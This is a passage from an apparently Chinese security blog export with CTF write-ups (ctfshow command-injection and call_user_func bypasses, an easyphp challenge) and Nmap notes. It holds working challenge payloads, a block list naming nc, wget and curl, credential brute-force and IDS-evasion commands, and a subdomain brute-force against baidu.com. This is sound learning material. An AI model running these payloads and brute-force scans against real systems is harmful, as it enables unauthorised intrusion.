<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|system|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正常payload：<br>?c&#x3D;cat &#x2F;f149_15_h3r3;<br>了解到一个新命令<strong>tee</strong></p>
<p><img src="https://img-blog.csdnimg.cn/ef21c0b92cfa4020a35d2eecd96c810a.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/155bbf7015c644e78f91879a196f54ff.png" alt="2"></p>
<p><strong>另一个方法</strong><br><a href="https://www.runoob.com/linux/linux-comm-sed.html">sed命令</a><br><img src="https://img-blog.csdnimg.cn/bcf4813af45545da88e99629f676795d.png" alt="3"><br><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs命令</a></p>
<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了::，不能用上题的<code>ctfshow=stfshow::getFlag</code>了。<br>call_user_func函数在php文档中还有思路<br><img src="https://img-blog.csdnimg.cn/b1a697d445cb4291a8ff69bf33f07212.png" alt="1"><br>也就是说call_user_func函数可以传入数组前面是类名，后面是方法名。<br>payload<code>POST ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code><br><img src="https://img-blog.csdnimg.cn/85b359077b3f45c888d616edab8888af.png" alt="4"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap学习笔记</title>
    <url>/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><blockquote>
<p>nmap 0.0.0.0（本机IP）</p>
</blockquote>
<p>nmap默认发送一个arp的ping包，探测目标主机0-1000的端口。<a href="https://blog.csdn.net/qq_47125775/article/details/108433224">arp（地址解析协议）</a></p>
<blockquote>
<p>nmap ip ip<br> nmap 0.0.0.0 1.1.1.1</p>
</blockquote>
<p>快速扫描多个IP</p>
<blockquote>
<p>nmap -p (范围) IP<br> nmap -p 80,20-200 1.1.1.1</p>
</blockquote>
<p>指定端口和范围进行扫描</p>
<blockquote>
<p>nmap 192.168.227.1&#x2F;24 -exclude 192.168.227.1</p>
</blockquote>
<p>扫描除过某一个ip外的所有子网主机</p>
<blockquote>
<p>nmap -sL 192.168.227.1&#x2F;24</p>
</blockquote>
<p>显示扫描的所有主机的列表</p>
<blockquote>
<p>namp -sp 1.1.1.1-255</p>
</blockquote>
<p>扫描内网的一个IP范围(ping扫描)</p>
<blockquote>
<p>nmap -sS 1.1.1.1<br> Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会<strong>在目标主机上产生任何日志记录</strong>,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root&#x2F;administrator权限。</p>
</blockquote>
<p>SYN半开放扫描</p>
<blockquote>
<p>namp -sT 192.168.227.154<br> 不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术<strong>只适用于找出TCP和UDP端口。</strong></p>
</blockquote>
<p>TCP扫描</p>
<blockquote>
<p>nmap -sU 192.168.206.124<br> 这种扫描技术<strong>用来寻找目标主机打开的UDP端口</strong>.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.</p>
</blockquote>
<p>UDP扫描</p>
<blockquote>
<p>nmap -sV 192.168.206.135<br> 版本检测是<strong>用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。这个扫描的话，速度会慢一些，67.86秒扫一个IP</strong>。</p>
</blockquote>
<p>Version版本扫描</p>
<blockquote>
<p>nmap -O 192.168.126.206</p>
</blockquote>
<p>OS操作系统类型检测</p>
<blockquote>
<p>nmap -O -PN 192.168.206.124<br> 如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。<br> 这个扫描整个c段局域网的话还是比较耗时的，但是信息收集很详细，大概耗时9分钟。</p>
</blockquote>
<p>NO ping 扫描</p>
<blockquote>
<p>10.1.1.0&#x2F;24 &#x3D; 10.1.1.1-10.1.1.255 #c段扫描<br> 10.1.1.0&#x2F;16 &#x3D; 10.1.1.1-10.1.255.255 #b段扫描<br> 10.1.1.0&#x2F;8 &#x3D; 10.1.1.1-10.255.255.255 #a段扫描</p>
</blockquote>
<p><strong>网段扫描格式</strong></p>
<blockquote>
<p>nmap -iL ip-address.txt</p>
</blockquote>
<p>从文件中读取需要扫描的列表</p>
<h2 id="nmap高级用法之脚本使用"><a href="#nmap高级用法之脚本使用" class="headerlink" title="nmap高级用法之脚本使用"></a>nmap高级用法之脚本使用</h2><p>MYSQL暴力破解</p>
<blockquote>
<p>nmap –script&#x3D;mysql-brute <target></p>
</blockquote>
<blockquote>
<p>3306&#x2F;tcp open  mysql<br> | mysql-brute:<br> |   Accounts<br> |     root:root - Valid credentials</p>
</blockquote>
<p>MsSQL进行暴力破解</p>
<blockquote>
<p>nmap -p 1433 –script ms-sql-brute –script-args userdb&#x3D;customuser.txt,passdb&#x3D;custompass.txt <host></p>
</blockquote>
<blockquote>
<p>| ms-sql-brute:<br> |   [192.168.100.128\TEST]<br> |     No credentials found<br> |     Warnings:<br> |       sa: AccountLockedOut<br> |   [192.168.100.128\PROD]<br> |     Credentials found:<br> |       webshop_reader:secret &#x3D;&gt; Login Success<br> |       testuser:secret1234 &#x3D;&gt; PasswordMustChange<br> |_      lordvader:secret1234 &#x3D;&gt; Login Success</p>
</blockquote>
<p>对Oracle数据库进行暴破解</p>
<blockquote>
<p>nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid&#x3D;ORCL <host></p>
</blockquote>
<blockquote>
<p>PORT     STATE  SERVICE REASON<br> 1521&#x2F;tcp open  oracle  syn-ack<br> | oracle-brute:<br> |   Accounts<br> |     system:powell &#x3D;&gt; Account locked<br> |     haxxor:haxxor &#x3D;&gt; Valid credentials<br> |   Statistics<br> |_    Perfomed 157 guesses in 8 seconds, average tps: 19</p>
</blockquote>
<p>对SSH进行暴力破解</p>
<blockquote>
<p>nmap -p 22 –script ssh-brute –script-args userdb&#x3D;users.lst,passdb&#x3D;pass.lst –script-args ssh-brute.timeout&#x3D;4s <target></p>
</blockquote>
<blockquote>
<p>22&#x2F;ssh open  ssh<br> | ssh-brute:<br> |  Accounts<br> |    username:password<br> |  Statistics<br> |_   Performed 32 guesses in 25 seconds.</p>
</blockquote>
<p>利用DNS进行子域名暴力破解</p>
<blockquote>
<p>nmap –script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a></p>
</blockquote>
<blockquote>
<p>λ nmap –script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a><br> Starting Nmap 7.50 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2017-07-25 13:12 ?<br> Nmap scan report for <a href="http://www.baidu.com/">www.baidu.com</a> (180.97.33.108)<br> Host is up (0.018s latency).<br> Other addresses for <a href="http://www.baidu.com/">www.baidu.com</a> (not scanned): 180.97.33.10<br> Not shown: 998 filtered ports<br> PORT    STATE SERVICE<br> 80&#x2F;tcp  open  http<br> 443&#x2F;tcp open  https<br> Host script results:<br> | dns-brute:<br> |   DNS Brute-force hostnames:<br> |     admin.baidu.com - 10.26.109.19<br> |     mx.baidu.com - 61.135.163.61<br> |     svn.baidu.com - 10.65.211.174<br> |     ads.baidu.com - 10.42.4.225<br> Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds</p>
</blockquote>
<h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><p>Nmap支持主机名,ip,网段的表示方式<br> 例如:blah.highon.coffee, namp.org&#x2F;24, 192.168.0.1;10.0.0-25.1-254</p>
<blockquote>
<p>-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段<br> -iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描<br> –exclude host1[, host2]        从扫描任务中需要排除的主机<br> –exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</p>
</blockquote>
<p>主机发现</p>
<blockquote>
<p>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描<br> -sn                     ping扫描,即主机发现<br> -Pn                     不检测主机存活<br> -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]  TCP SYN Ping&#x2F;TCP ACK Ping&#x2F;UDP Ping发现<br> -PE&#x2F;PP&#x2F;PM               使用ICMP echo, timestamp and netmask 请求包发现主机<br> -PO[prococol list]      使用IP协议包探测对方主机是否开启<br> -n&#x2F;-R                   不对IP进行域名反向解析&#x2F;为所有的IP都进行域名的反响解析</p>
</blockquote>
<p>扫描技巧</p>
<blockquote>
<p>-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM                 TCP SYN&#x2F;TCP connect()&#x2F;ACK&#x2F;TCP窗口扫描&#x2F;TCP Maimon扫描<br> -sU                             UDP扫描<br> -sN&#x2F;sF&#x2F;sX                       TCP Null，FIN，and Xmas扫描<br> –scanflags                     自定义TCP包中的flags<br> -sI zombie host[:probeport]     Idlescan<br> -sY&#x2F;sZ                          SCTP INIT&#x2F;COOKIE-ECHO 扫描<br> -sO                             使用IP protocol 扫描确定目标机支持的协议类型<br> -b “FTP relay host”             使用FTP bounce scan</p>
</blockquote>
<p>指定端口和扫描顺序</p>
<blockquote>
<p>-p                      特定的端口 -p80,443 或者 -p1-65535<br> -p U:PORT               扫描udp的某个端口, -p U:53<br> -F                      快速扫描模式,比默认的扫描端口还少<br> -r                      不随机扫描端口,默认是随机扫描的<br> –top-ports “number”    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于&#x2F;usr&#x2F;share&#x2F;nmap.nmap默认扫前1000个<br> –port-ratio “ratio”    扫描指定频率以上的端口</p>
</blockquote>
<p>服务版本识别</p>
<blockquote>
<p>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测<br> –version-intensity “level”     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7<br> –version-light                 打开轻量级模式,为–version-intensity 2的别名<br> –version-all                   尝试所有探测,为–version-intensity 9的别名<br> –version-trace                 显示出详细的版本侦测过程信息</p>
</blockquote>
<p>脚本扫描</p>
<blockquote>
<p>-sC                             根据端口识别的服务,调用默认脚本<br> –script&#x3D;”Lua scripts”          调用的脚本名<br> –script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     调用的脚本传递的参数<br> –script-args-file&#x3D;filename     使用文本传递参数<br> –script-trace                  显示所有发送和接收到的数据<br> –script-updatedb               更新脚本的数据库<br> –script-help&#x3D;”Lua script”      显示指定脚本的帮助</p>
</blockquote>
<p>OS识别</p>
<blockquote>
<p>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测<br> –osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)<br> –osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配<br> 防火墙&#x2F;IDS躲避和哄骗<br> -f; –mtu value                 指定使用分片、指定数据包的MTU.<br> -D decoy1,decoy2,ME             使用诱饵隐蔽扫描<br> -S IP-ADDRESS                   源地址欺骗<br> -e interface                    使用指定的接口<br> -g&#x2F; –source-port PROTNUM       使用指定源端口<br> –proxies url1,[url2],…       使用HTTP或者SOCKS4的代理</p>
</blockquote>
<blockquote>
<p>–data-length NUM               填充随机数据让数据包长度达到NUM<br> –ip-options OPTIONS            使用指定的IP选项来发送数据包<br> –ttl VALUE                     设置IP time-to-live域<br> –spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MAC地址伪装<br> –badsum                        使用错误的checksum来发送数据包<br> Nmap 输出<br> -oN                     将标准输出直接写入指定的文件<br> -oX                     输出xml文件<br> -oS                     将所有的输出都改为大写<br> -oG                     输出便于通过bash或者perl处理的格式,非xml<br> -oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出<br> -v                      提高输出信息的详细度<br> -d level                设置debug级别,最高是9<br> –reason                显示端口处于带确认状态的原因<br> –open                  只输出端口状态为open的端口<br> –packet-trace          显示所有发送或者接收到的数据包<br> –iflist                显示路由信息和接口,便于调试<br> –log-errors            把日志等级为errors&#x2F;warings的日志输出<br> –append-output         追加到指定的文件<br> –resume FILENAME       恢复已停止的扫描<br> –stylesheet PATH&#x2F;URL   设置XSL样式表，转换XML输出<br> –webxml                从namp.org得到XML的样式<br> –no-sytlesheet         忽略XML声明的XSL样式表</p>
</blockquote>
<p>其他nmap选项</p>
<blockquote>
<p>-6                      开启IPv6<br> -A                      OS识别,版本探测,脚本扫描和traceroute<br> –datedir DIRNAME       说明用户Nmap数据文件位置<br> –send-eth &#x2F; –send-ip  使用原以太网帧发送&#x2F;在原IP层发送<br> –privileged            假定用户具有全部权限<br> –unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限<br> -V                      打印版本信息<br> -h                      输出帮助</p>
</blockquote>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-web</title>
    <url>/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://img-blog.csdnimg.cn/777b9016dc7d4931934149f054da6fb2.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm...再想想"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Hgfks.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You're right"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>采用科学计数法绕过a&#x3D;9e9</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编写脚本</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">1000000</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到<br><img src="https://img-blog.csdnimg.cn/be82814851a4407c84b59756e4a81c42.png" alt="2"><br>即b&#x3D;53724</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#接收json格式的字符串并将其转化为数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>了解一下json格式<a href="https://zhuanlan.zhihu.com/p/74151127">JSON数据格式详解</a></p>
